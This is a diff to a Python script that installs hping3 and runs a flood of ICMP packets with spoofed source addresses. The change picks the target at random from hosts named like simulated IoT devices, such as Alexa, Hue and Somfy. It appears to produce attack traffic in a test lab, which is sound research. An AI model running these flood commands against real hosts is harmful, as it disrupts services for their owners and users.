@@ -11,6 +11,9 @@ import socket
 prep_time = random.randint(5, 10)   # seconds to wait before launching attack
 attack_time = random.randint(5, 10) # duration of the attack in seconds
 
+hosts = ["actor1_sim", "actor2_sim", "actor3_sim", "amazon_alexa_sim", "phillips_hue_sim", "somfy_sim"]
+host = random.choice(hosts)
+
 subprocess.run("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3", shell=True)
 
 print(f"Starting ICMP flood attack for {attack_time} seconds...")
@@ -23,7 +26,7 @@ result = socket.getaddrinfo(socket.gethostname(), None)
 src_ip = result[0][4][0]
 
 proc = subprocess.Popen(
-    f"hping3 --icmp actor1_sim --flood --rand-source",
+    f"hping3 --icmp {host} --flood --rand-source",
     shell=True,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE,
